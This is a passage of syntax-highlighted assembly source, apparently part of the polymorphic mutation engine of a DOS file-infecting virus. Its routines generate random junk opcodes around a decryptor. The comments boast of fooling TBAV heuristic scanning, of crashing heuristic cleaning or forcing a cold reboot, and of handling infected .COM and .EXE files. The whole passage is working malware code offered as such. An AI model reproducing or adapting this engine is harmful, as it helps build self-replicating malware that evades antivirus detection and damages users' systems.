 </span><span class="sc6">and</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">3Eh</span><span class="sc0">                 </span><span class="sc1">; Confuse it by using segment prefix</span><span class="sc0">
 </span><span class="sc6">or</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">26h</span><span class="sc0">
 </span><span class="sc6">stosb</span><span class="sc0">

</span><span class="sc5">Confused</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0028h</span><span class="sc0">               </span><span class="sc1">; Choose register displacement</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">Ranger</span><span class="sc0">
 </span><span class="sc6">test</span><span class="sc0">   </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">20h</span><span class="sc0">                 </span><span class="sc1">; SP ?</span><span class="sc0">
 </span><span class="sc6">jz</span><span class="sc0">     </span><span class="sc5">Valid</span><span class="sc0">
 </span><span class="sc6">add</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">08h</span><span class="sc0">                 </span><span class="sc1">; Use BP instead</span><span class="sc0">

</span><span class="sc5">Valid</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">8Dh</span><span class="sc0">                 </span><span class="sc1">; LEA opcode</span><span class="sc0">
 </span><span class="sc6">xchg</span><span class="sc0">   </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">
 </span><span class="sc6">stosb</span><span class="sc0">
 </span><span class="sc6">in</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">                  </span><span class="sc1">; Input from PIT</span><span class="sc0">
 </span><span class="sc6">and</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">
 </span><span class="sc6">xchg</span><span class="sc0">   </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
 </span><span class="sc6">jnz</span><span class="sc0">    </span><span class="sc5">Sequence</span><span class="sc0">               </span><span class="sc1">; Using byte/word immediate displacement</span><span class="sc0">
 </span><span class="sc6">or</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">80h</span><span class="sc0">
 </span><span class="sc6">stosb</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">Rand16</span><span class="sc0">                 </span><span class="sc1">; Word displacement</span><span class="sc0">
 </span><span class="sc6">stosw</span><span class="sc0">
 </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">Sequence</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">or</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">dl</span><span class="sc0">                  </span><span class="sc1">; Else, use byte</span><span class="sc0">
 </span><span class="sc6">stosb</span><span class="sc0">
 </span><span class="sc6">in</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">                  </span><span class="sc1">; Random byte from PIT</span><span class="sc0">
 </span><span class="sc6">stosb</span><span class="sc0">
 </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">Launcher</span><span class="sc4">:</span><span class="sc0">                      </span><span class="sc1">; Create "invalid" AAM opcode</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">Rand16</span><span class="sc0">              
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0D5h</span><span class="sc0">                
 </span><span class="sc6">jmp</span><span class="sc0">    </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">Tester</span><span class="sc0">

</span><span class="sc5">Machine</span><span class="sc4">:</span><span class="sc0">                       </span><span class="sc1">; Make a SMSW XX (Store Machine Status Word)</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">010Fh</span><span class="sc0">
 </span><span class="sc6">cmp</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">03h</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">       </span><span class="sc1">; Not same in a row</span><span class="sc0">
 </span><span class="sc6">je</span><span class="sc0">     </span><span class="sc5">Flaw</span><span class="sc0">
 </span><span class="sc6">stosw</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0005h</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">Ranger</span><span class="sc0">                 </span><span class="sc1">; An old instruction that came with LOADALL but</span><span class="sc0">
 </span><span class="sc6">cmp</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">04h</span><span class="sc0">                 </span><span class="sc1">; the most interesting "feature" is that it can </span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0E5h</span><span class="sc0">                </span><span class="sc1">; fool TBAV heuristic scanning... 8-)</span><span class="sc0">
 </span><span class="sc6">xchg</span><span class="sc0">   </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">                  </span><span class="sc1">; "Encountered an invalid instruction" !!!</span><span class="sc0">
 </span><span class="sc6">jnb</span><span class="sc0">    </span><span class="sc5">Store_Status</span><span class="sc0">           
 </span><span class="sc6">sub</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">05h</span><span class="sc0">
 </span><span class="sc6">add</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">                  </span><span class="sc1">; Make SMSW AX, BX, CX, DX, or BP</span><span class="sc0">

</span><span class="sc5">Store_Status</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">stosb</span><span class="sc0">
 </span><span class="sc6">ret</span><span class="sc0">


                          </span><span class="sc9">SubTtl</span><span class="sc0"> </span><span class="sc5">Esse</span><span class="sc0"> </span><span class="sc5">quam</span><span class="sc0"> </span><span class="sc5">videri...</span><span class="sc0">


</span><span class="sc5">Undefined</span><span class="sc4">:</span><span class="sc0">                     </span><span class="sc1">; Generate CLTS opcode (fool TBAV too!!)</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">060Fh</span><span class="sc0">
 </span><span class="sc6">cmp</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">02h</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">       </span><span class="sc1">; Not same in same row</span><span class="sc0">
 </span><span class="sc6">je</span><span class="sc0">     </span><span class="sc5">Flaw</span><span class="sc0">
 </span><span class="sc6">stosw</span><span class="sc0">

</span><span class="sc5">Flaw</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">Inputs</span><span class="sc4">:</span><span class="sc0">                        </span><span class="sc1">; Make an input from random 8-bit port</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">Rand16</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0E5h</span><span class="sc0">                </span><span class="sc1">; Immediate input opcode (input into AX)</span><span class="sc0">
 </span><span class="sc6">jnp</span><span class="sc0">    </span><span class="sc5">Tester</span><span class="sc0">
 </span><span class="sc6">dec</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">                     </span><span class="sc1">; 0E4h = input into AL</span><span class="sc0">

</span><span class="sc5">Tester</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">cmp</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">02h</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">       </span><span class="sc1">; Repeat, never never monomorphic!!</span><span class="sc0">
 </span><span class="sc6">je</span><span class="sc0">     </span><span class="sc5">Flaw</span><span class="sc0">
 </span><span class="sc6">stosw</span><span class="sc0">
 </span><span class="sc6">ret</span><span class="sc0">                           

</span><span class="sc5">Outputs</span><span class="sc4">:</span><span class="sc0">                       </span><span class="sc1">; Generate direct output onto (dummy?) port</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">Rand16</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0EDE7h</span><span class="sc0">              </span><span class="sc1">; This time there are two ports:</span><span class="sc0">
 </span><span class="sc6">js</span><span class="sc0">     </span><span class="sc5">Tester</span><span class="sc0">                 
 </span><span class="sc6">xor</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0601h</span><span class="sc0">               </span><span class="sc1">; Port 00EBh (byte) and port 00EDh (word)</span><span class="sc0">
 </span><span class="sc6">jmp</span><span class="sc0">    </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">Tester</span><span class="sc0">

</span><span class="sc5">Multiplication</span><span class="sc4">:</span><span class="sc0">                </span><span class="sc1">; Make a MUL/IMUL instruction with register</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">Rand16</span><span class="sc0">                 </span><span class="sc1">; operand</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0F6h</span><span class="sc0">
 </span><span class="sc6">jz</span><span class="sc0">     </span><span class="sc5">Byte_Type</span><span class="sc0">              </span><span class="sc1">; Byte or word? jump for byte</span><span class="sc0">
 </span><span class="sc6">inc</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">

</span><span class="sc5">Byte_Type</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">and</span><span class="sc0">    </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0Fh</span><span class="sc0">                 </span><span class="sc1">; Use any register for operand</span><span class="sc0">
 </span><span class="sc6">or</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0E0h</span><span class="sc0">                </span><span class="sc1">; AL/BL/CL/DL/AH/BH/CH/DH/AX/BX/CX/DX/SI/DI/BP/SP</span><span class="sc0">
 </span><span class="sc6">jmp</span><span class="sc0">    </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">Tester</span><span class="sc0">

</span><span class="sc5">Push_Pop</span><span class="sc4">:</span><span class="sc0">                      </span><span class="sc1">; Play with stack: PUSH and POP</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Retrieve</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Storage</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Storage</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">Ranger</span><span class="sc0">
 </span><span class="sc6">xlat</span><span class="sc0">                          </span><span class="sc1">; MOV AL,DS:[BX+AL]</span><span class="sc0">
 </span><span class="sc6">stosb</span><span class="sc0">
 </span><span class="sc6">cmp</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">60h</span><span class="sc0">                 </span><span class="sc1">; PUSHA opcode?</span><span class="sc0">
 </span><span class="sc6">jne</span><span class="sc0">    </span><span class="sc5">PopWord</span><span class="sc0">                </span><span class="sc1">; Branch if not</span><span class="sc0">
 </span><span class="sc6">inc</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
 </span><span class="sc6">jmp</span><span class="sc0">    </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">All_Pop</span><span class="sc0">          </span><span class="sc1">; Must be followed by POPA</span><span class="sc0">

</span><span class="sc5">PopWord</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">cmp</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">68h</span><span class="sc0">                 </span><span class="sc1">; Immediate PUSH ?</span><span class="sc0">
 </span><span class="sc6">je</span><span class="sc0">     </span><span class="sc5">Lodge</span><span class="sc0">                  </span><span class="sc1">; Yup, so jump</span><span class="sc0">
 </span><span class="sc6">cmp</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0FFh</span><span class="sc0">                </span><span class="sc1">; Memory-referenced PUSH ?</span><span class="sc0">
 </span><span class="sc6">jne</span><span class="sc0">    </span><span class="sc5">Cocked</span><span class="sc0">                 </span><span class="sc1">; Nope, so jump</span><span class="sc0">
 </span><span class="sc6">dec</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc0">                     </span><span class="sc1">; Abort last STOSB, 8-)</span><span class="sc0">
 </span><span class="sc6">in</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
 </span><span class="sc6">or</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">                  </span><span class="sc1">; Put prefix or not?</span><span class="sc0">
 </span><span class="sc6">jp</span><span class="sc0">     </span><span class="sc5">Antiprefix</span><span class="sc0">             </span><span class="sc1">; Ah! skip!</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">Segmented</span><span class="sc0">
 </span><span class="sc6">stosb</span><span class="sc0">                         </span><span class="sc1">; Ho ho ho... any prefix will do</span><span class="sc0">

</span><span class="sc5">Antiprefix</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">36FFh</span><span class="sc0">               </span><span class="sc1">; PUSH WORD PTR [XXXX]</span><span class="sc0">
 </span><span class="sc6">stosw</span><span class="sc0">

</span><span class="sc5">Lodge</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">Rand16</span><span class="sc0">
 </span><span class="sc6">stosw</span><span class="sc0">                         </span><span class="sc1">; Get random word</span><span class="sc0">

</span><span class="sc5">Cocked</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Bytez</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Retrieve</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Retrieve</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">Ranger</span><span class="sc0">
 </span><span class="sc6">xlat</span><span class="sc0">                          </span><span class="sc1">; MOV AL,DS:[BX+AL]</span><span class="sc0">

</span><span class="sc5">All_Pop</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">stosb</span><span class="sc0">
 </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">Overrun</span><span class="sc4">:</span><span class="sc0">                       </span><span class="sc1">; Generate NEG/NOT  AX/BX/CX/DX/BP/SP !!</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">04h</span><span class="sc0">
 </span><span class="sc6">cmp</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">Deathblow</span><span class="sc4">],</span><span class="sc2">02h</span><span class="sc0">
 </span><span class="sc6">jb</span><span class="sc0">     </span><span class="sc5">Allowed</span><span class="sc0">                </span><span class="sc1">; SP must be the first, 8-)</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0006h</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">Ranger</span><span class="sc0">                 </span><span class="sc1">; Choose AX, BX, CX, DX, BP, or SP</span><span class="sc0">

</span><span class="sc5">Allowed</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">cmp</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">04h</span><span class="sc0">                 </span><span class="sc1">; SP register?</span><span class="sc0">
 </span><span class="sc6">lahf</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
 </span><span class="sc6">in</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">                 </span><span class="sc1">; Input from PIT counter</span><span class="sc0">
 </span><span class="sc6">or</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">0D0h</span><span class="sc0">                
 </span><span class="sc6">test</span><span class="sc0">   </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">                  </span><span class="sc1">; Able to eliminate TBAV ! if NEG  SP used,</span><span class="sc0">
 </span><span class="sc6">jp</span><span class="sc0">     </span><span class="sc5">Hiccup</span><span class="sc0">                 </span><span class="sc1">; heuristic cleaning will stop with "Approached</span><span class="sc0">
 </span><span class="sc6">xor</span><span class="sc0">    </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">08h</span><span class="sc0">                 </span><span class="sc1">; stack crash." else if NOT  SP used, system</span><span class="sc0">
                               </span><span class="sc1">; will cold-reboot unexpectedly!!</span><span class="sc0">
</span><span class="sc5">Hiccup</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">sahf</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0F7h</span><span class="sc0">
 </span><span class="sc6">xchg</span><span class="sc0">   </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">
 </span><span class="sc6">jne</span><span class="sc0">    </span><span class="sc5">Preserve</span><span class="sc0">               </span><span class="sc1">; Using SP ? branch if not</span><span class="sc0">
 </span><span class="sc6">stosw</span><span class="sc0">                         </span><span class="sc1">; Store it</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">ax</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,((</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Remain</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Operator</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">/</span><span class="sc0"> </span><span class="sc2">02h</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">01h</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">Ranger</span><span class="sc0">
 </span><span class="sc6">cmp</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Remain</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Operator</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">/</span><span class="sc0"> </span><span class="sc2">02h</span><span class="sc0">
 </span><span class="sc6">je</span><span class="sc0">     </span><span class="sc5">Insert_Nothing</span><span class="sc0">
 </span><span class="sc6">add</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                  </span><span class="sc1">; Make sure MIA isn't gonna generate</span><span class="sc0">
 </span><span class="sc6">xchg</span><span class="sc0">   </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                  </span><span class="sc1">; a stack-in-need garbage</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">Operator</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc5">Insert_Nothing</span><span class="sc4">:</span><span class="sc0">                </span><span class="sc1">; There's a chance not to insert garbage</span><span class="sc0">
 </span><span class="sc6">pop</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
 </span><span class="sc6">inc</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">Deathblow</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; Increase counter</span><span class="sc0">

</span><span class="sc5">Preserve</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">stosw</span><span class="sc0">
 </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">Compound</span><span class="sc4">:</span><span class="sc0">                      </span><span class="sc1">; Choose segment override for memory operations</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">2Eh</span><span class="sc0">                 </span><span class="sc1">; CS: is the default</span><span class="sc0">
 </span><span class="sc6">cmp</span><span class="sc0">    </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc2">000Fh</span><span class="sc0">               </span><span class="sc1">; Check delta offset</span><span class="sc0">
 </span><span class="sc6">jbe</span><span class="sc0">    </span><span class="sc5">Contrast</span><span class="sc0">               </span><span class="sc1">; If below 16 then it's an .EXE file, can only</span><span class="sc0">
                               </span><span class="sc1">; use CS !!</span><span class="sc0">
</span><span class="sc5">Segmented</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">in</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">                 </span><span class="sc1">; Else,</span><span class="sc0">
 </span><span class="sc6">and</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">3Eh</span><span class="sc0">                 </span><span class="sc1">; MIA can use any segment override</span><span class="sc0">
 </span><span class="sc6">or</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">26h</span><span class="sc0">                 </span><span class="sc1">; DS:/ES:/SS:/CS:</span><span class="sc0">

</span><span class="sc5">Contrast</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">Construction</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">cmp</span><span class="sc0">    </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc2">0010h</span><span class="sc0">               </span><span class="sc1">; .COM or .EXE file?</span><span class="sc0">
 </span><span class="sc6">jb</span><span class="sc0">     </span><span class="sc5">Fever</span><span class="sc0">                  </span><span class="sc1">; Bomb if .EXE</span><span class="sc0">
 </span><span class="sc6">cmp</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Slack</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Lseek_BOF</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Fixup</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Decryptor</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Disk_IO</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">04h</span><span class="sc0">
 </span><span class="sc6">jna</span><span class="sc0">    </span><span class="sc5">Delimit</span><span class="sc0">                </span><span class="sc1">; Don't generate a JMP in another JMP's target</span><span class="sc0">

</span><span class="sc5">Fever</span><span class="sc4">:</span><span class="sc0">                         </span><span class="sc1">; Check whether previous instruction is RETN</span><span class="sc0">
 </span><span class="sc6">cmp</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">01h</span><span class="sc4">],</span><span class="sc2">0C3h</span><span class="sc0">
 </span><span class="sc6">jne</span><span class="sc0">    </span><span class="sc5">Especial</span><span class="sc0">               </span><span class="sc1">; Actually, not only RETN will proceed here</span><span class="sc0">
                               </span><span class="sc1">; but it doesn't matter</span><span class="sc0">
</span><span class="sc5">Delimit</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">bx</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Remain</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Suspicious</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">/</span><span class="sc0"> </span><span class="sc2">02h</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">Ranger</span><span class="sc0">
 </span><span class="sc6">shl</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">                 </span><span class="sc1">; Multiply by 2</span><span class="sc0">
 </span><span class="sc6">xchg</span><span class="sc0">   </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">Suspicious</span><span class="sc4">]</span><span class="sc0">
 </span><span class="sc6">pop</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc0">

</span><span class="sc5">Especial</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0E9h</span><span class="sc0">                </span><span class="sc1">; Store a near JMP opcode</span><span class="sc0">
 </span><span class="sc6">stosb</span><span class="sc0">
 </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">Operator</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc9">dw</span><span class="sc0">     </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Single</span><span class="sc0">          </span><span class="sc1">; \
 dw     offset Mover           ;   \
 dw     offset Immediate       ;     \
 dw     offset Reference       ;       \ </span><span class="sc0">
 </span><span class="sc9">dw</span><span class="sc0">     </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Compute</span><span class="sc0">         </span><span class="sc1">;         \
 dw     offset Exchanger       ;           \   </span><span class="sc0">
 </span><span class="sc9">dw</span><span class="sc0">     </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Rotation</span><span class="sc0">        </span><span class="sc1">;             \   </span><span class="sc0">
 </span><span class="sc9">dw</span><span class="sc0">     </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Effective</span><span class="sc0">       </span><span class="sc1">;               \   </span><span class="sc0">
                               </span><span class="sc1">;                 \
Suspicious:                    ;                   \   Garbage, trash, rubbish,</span><span class="sc0">
 </span><span class="sc9">dw</span><span class="sc0">     </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Launcher</span><span class="sc0">        </span><span class="sc1">;                     \ junks or whatever You call</span><span class="sc0">
 </span><span class="sc9">dw</span><span class="sc0">     </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Machine</span><span class="sc0">         </span><span class="sc1">;                     / it worthless instruction!!</span><span class="sc0">
 </span><span class="sc9">dw</span><span class="sc0">     </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Undefined</span><span class="sc0">       </span><span class="sc1">;                   /   </span><span class="sc0">
 </span><span class="sc9">dw</span><span class="sc0">     </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Inputs</span><span class="sc0">          </span><span class="sc1">;                 /   </span><span class="sc0">
 </span><span class="sc9">dw</span><span class="sc0">     </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Outputs</span><span class="sc0">         </span><span class="sc1">;               /</span><span class="sc0">
 </span><span class="sc9">dw</span><span class="sc0">     </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Multiplication</span><span class="sc0">  </span><span class="sc1">;             /</span><span class="sc0">
                               </span><span class="sc1">;           /</span><span class="sc0">
